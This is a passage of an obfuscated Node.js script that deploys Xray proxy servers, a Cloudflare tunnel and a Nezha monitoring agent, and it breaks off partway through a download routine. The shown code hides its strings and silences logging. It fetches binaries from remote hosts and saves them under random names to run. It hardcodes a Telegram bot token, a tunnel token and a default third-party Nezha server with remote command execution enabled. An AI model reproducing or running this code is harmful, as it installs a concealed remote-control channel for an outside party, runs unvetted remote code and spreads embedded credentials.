#!/usr/bin/env node

const _0x543149 = _0xca60
;(function (_0x17255d, _0x55e125) {
  const _0x1e440d = _0xca60,
    _0x3bb8e6 = _0x17255d()
  while (!![]) {
    try {
      const _0x1d75be =
        parseInt(_0x1e440d(0x105)) / 0x1 +
        -parseInt(_0x1e440d(0xaf)) / 0x2 +
        -parseInt(_0x1e440d(0xd3)) / 0x3 +
        (-parseInt(_0x1e440d(0x183)) / 0x4) * (-parseInt(_0x1e440d(0x98)) / 0x5) +
        (parseInt(_0x1e440d(0x106)) / 0x6) * (parseInt(_0x1e440d(0x16e)) / 0x7) +
        (parseInt(_0x1e440d(0x198)) / 0x8) * (-parseInt(_0x1e440d(0xdb)) / 0x9) +
        parseInt(_0x1e440d(0x152)) / 0xa
      if (_0x1d75be === _0x55e125) break
      else _0x3bb8e6['push'](_0x3bb8e6['shift']())
    } catch (_0xaf891a) {
      _0x3bb8e6['push'](_0x3bb8e6['shift']())
    }
  }
})(_0x27b3, 0x7df90)
const http = require('http'),
  axios = require('axios'),
  os = require('os'),
  fs = require('fs'),
  path = require('path'),
  crypto = require(_0x543149(0x128)),
  { promisify } = require('util'),
  { exec: execCommand, execSync } = require(_0x543149(0xb6)),
  exec = promisify(execCommand),
  PORT = process[_0x543149(0x9f)][_0x543149(0x86)] || 0xbb8,
  SUB_PATH = process[_0x543149(0x9f)][_0x543149(0xec)] || _0x543149(0xdf),
  NAME = process[_0x543149(0x9f)][_0x543149(0x122)] || _0x543149(0x137),
  CFIP = process['env'][_0x543149(0x158)] || _0x543149(0xda),
  CFPORT = process[_0x543149(0x9f)][_0x543149(0xff)] || 0x1bb,
  UPLOAD_URL = process[_0x543149(0x9f)][_0x543149(0x14d)] || '',
  FILE_PATH = process[_0x543149(0x9f)][_0x543149(0xb7)] || _0x543149(0x17b),
  NEZHA_SERVER = process[_0x543149(0x9f)][_0x543149(0xce)] || _0x543149(0x150),
  NEZHA_PORT = process[_0x543149(0x9f)][_0x543149(0x135)] || '',
  NEZHA_KEY = process[_0x543149(0x9f)][_0x543149(0x147)] || _0x543149(0x12d),
  UUID = process[_0x543149(0x9f)][_0x543149(0x90)] || _0x543149(0x8b),
  ARGO_AUTH = process[_0x543149(0x9f)][_0x543149(0xe0)] || _0x543149(0x180),
  ARGO_DOMAIN = process[_0x543149(0x9f)][_0x543149(0xba)] || _0x543149(0x112),
  ARGO_PORT = process[_0x543149(0x9f)][_0x543149(0x121)] || 0xe2e1,
  S5_PORT = process[_0x543149(0x9f)][_0x543149(0x148)] || '',
  HY2_PORT = process['env'][_0x543149(0xdd)] || '',
  REALITY_PORT = process[_0x543149(0x9f)]['REALITY_PORT'] || '',
  CHAT_ID = process[_0x543149(0x9f)]['CHAT_ID'] || _0x543149(0xfd),
  BOT_TOKEN = process['env'][_0x543149(0xa7)] || '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
  SHOW_LOG = ![_0x543149(0xf4), _0x543149(0x172), 'no'][_0x543149(0xd7)](
    (process[_0x543149(0x9f)][_0x543149(0x192)] || _0x543149(0xf4))['toLowerCase']()
  )
!SHOW_LOG && ((console['log'] = () => {}), (console[_0x543149(0x101)] = () => {}))
function _0x27b3() {
  const _0x393a9f = [
    '2096',
    '\x0a\x0atrojan://',
    'blackhole',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'renameSync',
    'readFile',
    'firefox',
    '\x0a\x0avmess://',
    'tunnel.yml',
    'del\x20/f\x20/q\x20',
    'block',
    'NEZHA_PORT',
    'trojan-ws-in',
    'js-node',
    '127.0.0.1',
    'hysteria',
    'vless',
    'substring',
    'export',
    'Empowerment\x20failed\x20for\x20',
    '\x20-s\x20',
    'post',
    'App\x20is\x20running',
    'boot.log',
    '\x20in\x20clouudflare',
    'application/json',
    'x25519',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    'unlinkSync',
    'NEZHA_KEY',
    'S5_PORT',
    'org',
    's5-in',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    'vless-fallback-in',
    'UPLOAD_URL',
    'Download\x20',
    'Telegram\x20message\x20sent\x20successfully',
    'nezha.933993.xyz:443',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    '4608880eRnOvU',
    '/config.json\x20>/dev/null\x202>&1\x20&',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    'vmess-ws-in',
    'mkdirSync',
    'CFIP',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'log',
    '/vless-argo',
    'pop',
    'data',
    'Unhandled\x20error\x20in\x20startserver:',
    '--tls',
    '/vmess-argo',
    'createWriteStream',
    'finish',
    '/sendMessage',
    '443',
    'password',
    'country_code',
    '\x20-p\x20',
    'message',
    '.download',
    'stream',
    '8443',
    'toUpperCase',
    'config.json',
    '161ZYXaGQ',
    'filter',
    'tcp',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'disable',
    'status',
    'der',
    'existsSync',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    'sha256',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'resolve',
    'php\x20running\x20error:\x20',
    '.npm',
    'Unknown',
    'quic',
    'none',
    'Mozilla/5.0',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiMjA4MTQzNWUtMmU2OS00OGEzLTk4YWItMWQ1Nzk4NjI0YjJiIiwicyI6Ik56QXdOR00xT1dNdE5qTTNZeTAwTVRZMkxXSm1Zekl0TTJZNFpUQXpOVGRtTm1OayJ9',
    'from',
    'Nodes\x20uploaded\x20successfully',
    '120ZkozxT',
    '/dev/null',
    'https://api.ip.sb/geoip',
    '/api/add-nodes',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'https://api.telegram.org/bot',
    'www.iij.ad.jp:443',
    'https://bing.com',
    'npm\x20running\x20error:\x20',
    '\x20>/dev/null\x202>&1\x20&',
    'Empowerment\x20success\x20for\x20',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'clear',
    'charAt',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    'SHOW_LOG',
    'raw',
    'unlink',
    'cert.pem',
    '\x20-c\x20',
    'has',
    '8tUPwkU',
    'nohup\x20',
    'www.iij.ad.jp',
    'config.yaml',
    '-----END\x20CERTIFICATE-----\x0a',
    '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:',
    '\x22\x20-out\x20\x22',
    'generateKeyPairSync',
    '2053',
    'list.txt',
    'arm',
    'basename',
    '```',
    'dirname',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'now',
    'aarch64',
    'PORT',
    'Error\x20executing\x20command:\x20',
    'socks',
    '\x20successfully',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    'e18d5155-c6c5-4e81-aa89-09e204fd07d4',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'tls',
    'test',
    'pkill\x20-f\x20\x22[',
    'UUID',
    'https+local://8.8.8.8/dns-query',
    'privateKey',
    'inbounds',
    'hex',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    '6665vaJmdv',
    'http\x20server\x20is\x20running\x20on\x20',
    'true',
    'vless-tcp-in',
    '.exe\x20>\x20nul\x202>&1',
    'text/html;\x20charset=utf-8',
    '\x0ahysteria2://',
    'env',
    '\x20is\x20running',
    'isp',
    'ARGO_DOMAIN:',
    '/bot',
    '&fp=firefox&type=ws&host=',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    'spki',
    'BOT_TOKEN',
    'MarkdownV2',
    'Private\x20Key:',
    'taskkill\x20/f\x20/im\x20',
    'all',
    'trim',
    'replace',
    'xtls-rprx-vision',
    '1137112aVjROP',
    'length',
    'reality',
    '\x20>/dev/null\x202>&1',
    'Retrying\x20',
    'web\x20running\x20error:\x20',
    'openssl\x20version',
    'child_process',
    'FILE_PATH',
    '/vmess-argo?ed=2560',
    'arm64',
    'ARGO_DOMAIN',
    '\x0a\x20\x20\x20\x20',
    '\x0aclient_secret:\x20',
    'push',
    'ArgoDomain:',
    'trojan',
    'Error\x20in\x20startserver:',
    'tunnel.json',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    'toString',
    'auto',
    'Failed\x20to\x20get\x20IP\x20address:',
    '/web',
    'sub.txt',
    '\x0a\x20\x20tunnel:\x20',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    '/trojan-argo',
    'NEZHA_SERVER',
    'subarray',
    '&type=tcp&headerType=none#',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    '2141883HssRVD',
    '\x0a\x20\x20credentials-file:\x20',
    'publicKey',
    'writeHead',
    'includes',
    'stringify',
    'stdout',
    'mfa.gov.ua',
    '3493647jKRBOm',
    '\x20from\x20backup\x20source',
    'HY2_PORT',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    '800',
    'ARGO_AUTH',
    'catch',
    'Public\x20Key:',
    'then',
    '\x20failed:\x20',
    'https://amd64.oooen.com',
    '\x20>\x20nul\x202>&1',
    '/agent',
    'close',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'countryCode',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'SUB_PATH',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    '&pinSHA256=',
    'index.html',
    'http://ipv4.ip.sb',
    'fileName',
    'direct',
    'private.key',
    'false',
    'join',
    'rm\x20-rf\x20',
    'readFileSync',
    'http://ipv6.ip.sb',
    '\x0avless://',
    'forEach',
    'ignore',
    'BggqhkjOPQMBBw==\x0a',
    '7575949494',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'CFPORT',
    'text/plain;\x20charset=utf-8',
    'error',
    'hysteria-in',
    'digest',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    '990861PDQOSB',
    '181290kQqUcf',
    'match',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'vless-in',
    'floor',
    'chmodSync',
    'utf8',
    'unshift',
    'write',
    'utf-8',
    'proxy',
    'railway.933993.xyz',
    '\x0aPublicKey:\x20',
    'abcdefghijklmnopqrstuvwxyz',
    'base64',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    'platform',
    'https://amd64.ssss.nyc.mn',
    'get',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    'writeFileSync',
    '\x22\x20>\x20/dev/null\x202>&1',
    'slice',
    'promises',
    '2087',
    'base64url',
    'ARGO_PORT',
    'NAME',
    '2083',
    'split',
    'fileUrls',
    'win32',
    'end',
    'crypto',
    'createServer'
  ]
  _0x27b3 = function () {
    return _0x393a9f
  }
  return _0x27b3()
}
function alwaysLog(_0x56e8d6) {
  const _0x344255 = _0x543149
  process[_0x344255(0xd9)][_0x344255(0x10f)](_0x56e8d6 + '\x0a')
}
if (!fs['existsSync'](FILE_PATH)) fs[_0x543149(0x157)](FILE_PATH)
else {
}
function isValidPort(_0x3435eb) {
  const _0x521422 = _0x543149
  try {
    if (_0x3435eb === null || _0x3435eb === undefined || _0x3435eb === '') return ![]
    if (typeof _0x3435eb === 'string' && _0x3435eb[_0x521422(0xac)]() === '') return ![]
    const _0xd74fff = parseInt(_0x3435eb)
    if (isNaN(_0xd74fff)) return ![]
    if (_0xd74fff < 0x1 || _0xd74fff > 0xffff) return ![]
    return !![]
  } catch (_0xd3072e) {
    return ![]
  }
}
function generateRandomName() {
  const _0x2893f2 = _0x543149,
    _0xed13c = _0x2893f2(0x114)
  let _0x57cba9 = ''
  for (let _0x3b5f20 = 0x0; _0x3b5f20 < 0x6; _0x3b5f20++) {
    _0x57cba9 += _0xed13c['charAt'](Math[_0x2893f2(0x10b)](Math['random']() * _0xed13c['length']))
  }
  return _0x57cba9
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
function _0xca60(_0x12e37d, _0xff91aa) {
  const _0x27b319 = _0x27b3()
  return (
    (_0xca60 = function (_0xca6070, _0x56a679) {
      _0xca6070 = _0xca6070 - 0x76
      let _0x12bea0 = _0x27b319[_0xca6070]
      return _0x12bea0
    }),
    _0xca60(_0x12e37d, _0xff91aa)
  )
}
let npmPath = path[_0x543149(0xf5)](FILE_PATH, npmName),
  phpPath = path['join'](FILE_PATH, phpName),
  webPath = path[_0x543149(0xf5)](FILE_PATH, webName),
  botPath = path[_0x543149(0xf5)](FILE_PATH, botName),
  subPath = path['join'](FILE_PATH, _0x543149(0xca)),
  listPath = path[_0x543149(0xf5)](FILE_PATH, _0x543149(0x7e)),
  bootLogPath = path[_0x543149(0xf5)](FILE_PATH, _0x543149(0x141)),
  configPath = path[_0x543149(0xf5)](FILE_PATH, _0x543149(0x16d)),
  certPath = path['resolve'](FILE_PATH, _0x543149(0x195)),
  keyPath = path[_0x543149(0x179)](FILE_PATH, _0x543149(0xf3))
function deleteNodes() {
  const _0x587ebb = _0x543149
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x587ebb(0x175)](subPath)) return
    let _0x51471e
    try {
      _0x51471e = fs[_0x587ebb(0xf7)](subPath, _0x587ebb(0x110))
    } catch {
      return null
    }
    const _0x419d86 = Buffer['from'](_0x51471e, _0x587ebb(0x115))['toString'](_0x587ebb(0x110)),
      _0x4dcd97 = _0x419d86[_0x587ebb(0x124)]('\x0a')[_0x587ebb(0x16f)]((_0x3343c6) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x587ebb(0x8e)](_0x3343c6)
      )
    if (_0x4dcd97[_0x587ebb(0xb0)] === 0x0) return
    return (
      axios['post'](UPLOAD_URL + '/api/delete-nodes', JSON['stringify']({ nodes: _0x4dcd97 }), { headers: { 'Content-Type': _0x587ebb(0x143) } })[
        'catch'
      ]((_0x457d3a) => {
        return null
      }),
      null
    )
  } catch (_0x3b62e9) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x3ba91f = _0x543149
  try {
    const _0xe8c8a4 = fs['readdirSync'](FILE_PATH)
    _0xe8c8a4[_0x3ba91f(0xfa)]((_0x3c8de5) => {
      const _0x5e9b27 = _0x3ba91f,
        _0x2f5d04 = path[_0x5e9b27(0xf5)](FILE_PATH, _0x3c8de5)
      try {
        const _0x5a15fa = fs['statSync'](_0x2f5d04)
        _0x5a15fa['isFile']() && fs['unlinkSync'](_0x2f5d04)
      } catch (_0x3ed54e) {}
    })
  } catch (_0x590714) {}
}
function generateX25519Keypair() {
  const _0x28356b = _0x543149,
    { publicKey: _0x3a6102, privateKey: _0x1b2a27 } = crypto[_0x28356b(0x7c)](_0x28356b(0x144)),
    _0x32b1ef = _0x1b2a27[_0x28356b(0x13c)]({ type: 'pkcs8', format: _0x28356b(0x174) })[_0x28356b(0xcf)](-0x20),
    _0x41425c = _0x3a6102[_0x28356b(0x13c)]({ type: _0x28356b(0xa6), format: _0x28356b(0x174) })['subarray'](-0x20)
  return { privateKey: _0x32b1ef[_0x28356b(0xc6)](_0x28356b(0x120)), publicKey: _0x41425c[_0x28356b(0xc6)](_0x28356b(0x120)) }
}
function generateOrLoadKeyPair() {
  const _0x5d1bdb = _0x543149,
    _0x48e6ed = path[_0x5d1bdb(0xf5)](FILE_PATH, 'key.txt')
  if (fs[_0x5d1bdb(0x175)](_0x48e6ed)) {
    const _0xfec9bf = fs[_0x5d1bdb(0xf7)](_0x48e6ed, _0x5d1bdb(0x10d)),
      _0x10f3e6 = _0xfec9bf['match'](/PrivateKey:\s*(.*)/),
      _0x362f8f = _0xfec9bf['match'](/PublicKey:\s*(.*)/)
    if (_0x10f3e6 && _0x362f8f) {
      ;((privateKey = _0x10f3e6[0x1][_0x5d1bdb(0xac)]()),
        (publicKey = _0x362f8f[0x1][_0x5d1bdb(0xac)]()),
        console[_0x5d1bdb(0x15a)](_0x5d1bdb(0xa9), privateKey),
        console['log'](_0x5d1bdb(0xe2), publicKey))
      return
    }
  }
  const _0x3a2d64 = generateX25519Keypair()
  ;((privateKey = _0x3a2d64[_0x5d1bdb(0x92)]),
    (publicKey = _0x3a2d64[_0x5d1bdb(0xd5)]),
    fs[_0x5d1bdb(0x11b)](_0x48e6ed, 'PrivateKey:\x20' + privateKey + _0x5d1bdb(0x113) + publicKey + '\x0a', 'utf8'),
    console[_0x5d1bdb(0x15a)](_0x5d1bdb(0xa9), privateKey),
    console[_0x5d1bdb(0x15a)]('Public\x20Key:', publicKey))
}
const FALLBACK_EC_KEY =
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a' +
    _0x543149(0xfc) +
    _0x543149(0x171) +
    _0x543149(0xd1) +
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a' +
    _0x543149(0x109) +
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a' +
    _0x543149(0xe9),
  FALLBACK_CERT =
    _0x543149(0xfe) +
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a' +
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a' +
    _0x543149(0x191) +
    _0x543149(0x8c) +
    _0x543149(0xc3) +
    _0x543149(0xed) +
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a' +
    _0x543149(0x104) +
    _0x543149(0x79)
function ensureTlsCertificates(_0x2eaa76, _0x5959ba) {
  const _0xf3eecf = _0x543149
  if (fs[_0xf3eecf(0x175)](_0x2eaa76) && fs['existsSync'](_0x5959ba)) return
  fs[_0xf3eecf(0x157)](path[_0xf3eecf(0x82)](_0x2eaa76), { recursive: !![] })
  try {
    ;(execSync(_0xf3eecf(0xb5), { stdio: _0xf3eecf(0xfb) }),
      execSync(_0xf3eecf(0xc4) + _0x5959ba + '\x22', { stdio: _0xf3eecf(0xfb) }),
      execSync(_0xf3eecf(0x151) + _0x5959ba + _0xf3eecf(0x7b) + _0x2eaa76 + _0xf3eecf(0x116), { stdio: _0xf3eecf(0xfb) }))
    return
  } catch (_0x50b2bf) {}
  ;(fs[_0xf3eecf(0x11b)](_0x5959ba, FALLBACK_EC_KEY), fs['writeFileSync'](_0x2eaa76, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x3f2c0c) {
  const _0x1d550f = _0x543149
  try {
    const _0xeb8c1 = execSync(_0x1d550f(0x8a) + _0x3f2c0c + '\x22', { encoding: _0x1d550f(0x10d), timeout: 0xbb8 })[_0x1d550f(0xac)](),
      _0x2a3c7e = _0xeb8c1[_0x1d550f(0x107)](/=(.+)$/)
    if (_0x2a3c7e && _0x2a3c7e[0x1]) return _0x2a3c7e[0x1][_0x1d550f(0x16c)]()
  } catch (_0x5df945) {}
  try {
    const _0x47665d = fs[_0x1d550f(0xf7)](_0x3f2c0c, _0x1d550f(0x10d)),
      _0x5b288c = _0x47665d['match'](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x5b288c) return ''
    const _0xbf69cf = _0x5b288c[0x1][_0x1d550f(0xad)](/\s/g, ''),
      _0x838bff = Buffer[_0x1d550f(0x181)](_0xbf69cf, _0x1d550f(0x115)),
      _0x874aa4 = crypto['createHash'](_0x1d550f(0x177))['update'](_0x838bff)[_0x1d550f(0x103)](_0x1d550f(0x94))
    return _0x874aa4[_0x1d550f(0x107)](/.{2}/g)[_0x1d550f(0xf5)](':')[_0x1d550f(0x16c)]()
  } catch (_0x27008c) {
    return (console[_0x1d550f(0x101)](_0x1d550f(0x154), _0x27008c), '')
  }
}
async function generateConfig() {
  const _0x3b627b = _0x543149,
    _0x49d7cf = {
      log: { access: _0x3b627b(0x184), error: _0x3b627b(0x184), loglevel: _0x3b627b(0x17e) },
      inbounds: [
        {
          tag: _0x3b627b(0x14c),
          port: ARGO_PORT,
          listen: '::',
          protocol: 'vless',
          settings: {
            clients: [{ id: UUID, flow: _0x3b627b(0xae) }],
            decryption: 'none',
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x3b627b(0x15b), dest: 0xbba },
              { path: _0x3b627b(0x160), dest: 0xbbb },
              { path: _0x3b627b(0xcd), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x3b627b(0x170) }
        },
        {
          tag: _0x3b627b(0x9b),
          port: 0xbb9,
          listen: '127.0.0.1',
          protocol: _0x3b627b(0x13a),
          settings: { clients: [{ id: UUID }], decryption: _0x3b627b(0x17e) },
          streamSettings: { network: _0x3b627b(0x170), security: _0x3b627b(0x17e) }
        },
        {
          tag: 'vless-ws-in',
          port: 0xbba,
          listen: _0x3b627b(0x138),
          protocol: 'vless',
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x3b627b(0x17e) },
          streamSettings: { network: 'ws', security: _0x3b627b(0x17e), wsSettings: { path: _0x3b627b(0x15b) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x3b627b(0x8d), 'quic'], metadataOnly: ![] }
        },
        {
          tag: _0x3b627b(0x156),
          port: 0xbbb,
          listen: _0x3b627b(0x138),
          protocol: 'vmess',
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x3b627b(0x160) } },
          sniffing: { enabled: !![], destOverride: ['http', _0x3b627b(0x8d), _0x3b627b(0x17d)], metadataOnly: ![] }
        },
        {
          tag: _0x3b627b(0x136),
          port: 0xbbc,
          listen: _0x3b627b(0x138),
          protocol: _0x3b627b(0xbf),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: _0x3b627b(0x17e), wsSettings: { path: _0x3b627b(0xcd) } },
          sniffing: { enabled: !![], destOverride: ['http', 'tls', _0x3b627b(0x17d)], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x3b627b(0x91)] },
      outbounds: [
        { protocol: 'freedom', tag: _0x3b627b(0xf2) },
        { protocol: _0x3b627b(0x12c), tag: _0x3b627b(0x134) }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x49d7cf[_0x3b627b(0x93)][_0x3b627b(0xbd)]({
      tag: _0x3b627b(0x10a),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x3b627b(0x13a),
      settings: { clients: [{ id: UUID, flow: _0x3b627b(0xae) }], decryption: _0x3b627b(0x17e) },
      streamSettings: {
        network: _0x3b627b(0x193),
        security: _0x3b627b(0xb1),
        realitySettings: { show: ![], dest: _0x3b627b(0x189), xver: 0x0, serverNames: [_0x3b627b(0x77)], privateKey: privateKey, shortIds: [''] }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x49d7cf[_0x3b627b(0x93)][_0x3b627b(0xbd)]({
        tag: _0x3b627b(0x102),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: _0x3b627b(0x139),
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: _0x3b627b(0x139),
          hysteriaSettings: { version: 0x2, masquerade: { type: _0x3b627b(0x111), url: _0x3b627b(0x18a) } },
          security: _0x3b627b(0x8d),
          tlsSettings: { alpn: ['h3'], certificates: [{ certificateFile: certPath, keyFile: keyPath }] }
        }
      }),
    isValidPort(S5_PORT) &&
      _0x49d7cf[_0x3b627b(0x93)][_0x3b627b(0xbd)]({
        tag: _0x3b627b(0x14a),
        listen: '::',
        port: parseInt(S5_PORT),
        protocol: _0x3b627b(0x88),
        settings: { auth: _0x3b627b(0x165), accounts: [{ user: UUID[_0x3b627b(0x13b)](0x0, 0x8), pass: UUID[_0x3b627b(0x11d)](-0xc) }], udp: !![] }
      }),
    fs[_0x3b627b(0x11b)](path[_0x3b627b(0xf5)](FILE_PATH, 'config.json'), JSON['stringify'](_0x49d7cf, null, 0x2)))
}
function getSystemArchitecture() {
  const _0x1833ff = _0x543149,
    _0x54bcc2 = os['arch']()
  return _0x54bcc2 === _0x1833ff(0x7f) || _0x54bcc2 === _0x1833ff(0xb9) || _0x54bcc2 === _0x1833ff(0x85) ? _0x1833ff(0x7f) : 'amd'
}
function downloadFile(_0x30884c, _0x4fd736, _0x4c1add) {
  const _0x2995b5 = _0x543149,
    _0xc8abc0 = _0x30884c,
    _0x34564f = _0xc8abc0 + _0x2995b5(0x169)
  !fs[_0x2995b5(0x175)](FILE_PATH) && fs[_0x2995b5(0x157)](FILE_PATH, { recursive: !![] })
  const _0x5ed516 = fs[_0x2995b5(0x161)](_0x34564f)
  axios({ method: _0x2995b5(0x119), url: _0x4fd736, responseType: _0x2995b5(0x16a) })
    [_0x2995b5(0xe3)]((_0x2092fd) => {
      const _0x5a2ac7 = _0x2995b5
      ;(_0x2092fd[_0x5a2ac7(0x15d)]['pipe'](_0x5ed516),
        _0x5ed516['on'](_0x5a2ac7(0x162), () => {
          const _0xb2604b = _0x5a2ac7
          _0x5ed516[_0xb2604b(0xe8)]((_0x1923e0) => {
            const _0x3aadec = _0xb2604b
            if (_0x1923e0) {
              const _0xfd78a9 = _0x3aadec(0x14e) + path[_0x3aadec(0x80)](_0xc8abc0) + _0x3aadec(0xe4) + _0x1923e0[_0x3aadec(0x168)]
              ;(fs[_0x3aadec(0x194)](_0x34564f, () => {}), console['error'](_0xfd78a9), _0x4c1add(_0xfd78a9))
              return
            }
            try {
              fs[_0x3aadec(0x12e)](_0x34564f, _0xc8abc0)
            } catch (_0x24b4af) {
              const _0x17f31b = 'Download\x20' + path[_0x3aadec(0x80)](_0xc8abc0) + '\x20failed:\x20' + _0x24b4af[_0x3aadec(0x168)]
              ;(fs[_0x3aadec(0x194)](_0x34564f, () => {}), console[_0x3aadec(0x101)](_0x17f31b), _0x4c1add(_0x17f31b))
              return
            }
            ;(console['log']('Download\x20' + path[_0x3aadec(0x80)](_0xc8abc0) + _0x3aadec(0x89)), _0x4c1add(null, _0xc8abc0))
          })
        }),
        _0x5ed516['on'](_0x5a2ac7(0x101), (_0x1750bc) => {
          const _0x2374c1 = _0x5a2ac7
          fs[_0x2374c1(0x194)](_0x34564f, () => {})
          const _0x13df52 = _0x2374c1(0x14e) + path[_0x2374c1(0x80)](_0xc8abc0) + '\x20failed:\x20' + _0x1750bc['message']
          ;(console[_0x2374c1(0x101)](_0x13df52), _0x4c1add(_0x13df52))
        }))
    })
    [_0x2995b5(0xe1)]((_0x52041b) => {
      const _0x154d6c = _0x2995b5
      fs[_0x154d6c(0x194)](_0x34564f, () => {})
      const _0x83b7c0 = 'Download\x20' + path[_0x154d6c(0x80)](_0xc8abc0) + '\x20failed:\x20' + _0x52041b[_0x154d6c(0x168)]
      ;(console[_0x154d6c(0x101)](_0x83b7c0), _0x4c1add(_0x83b7c0))
    })
}
async function downloadFilesAndRun() {
  const _0x3f2494 = _0x543149,
    _0x533ab3 = getSystemArchitecture(),
    _0x115e16 = getFilesForArchitecture(_0x533ab3)
  if (_0x115e16[_0x3f2494(0xb0)] === 0x0) {
    console[_0x3f2494(0x15a)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture')
    return
  }
  const _0x40223c = _0x115e16['map']((_0x4b3e66) => {
    return new Promise((_0x5d5e02, _0x44d07f) => {
      const _0x5d1a98 = (_0x3d45a6) => {
        downloadFile(_0x4b3e66['fileName'], _0x4b3e66['fileUrls'][_0x3d45a6], (_0x41dea9, _0x5c44d1) => {
          const _0x10c49f = _0xca60
          if (!_0x41dea9) {
            _0x5d5e02(_0x5c44d1)
            return
          }
          if (_0x3d45a6 + 0x1 < _0x4b3e66[_0x10c49f(0x125)][_0x10c49f(0xb0)]) {
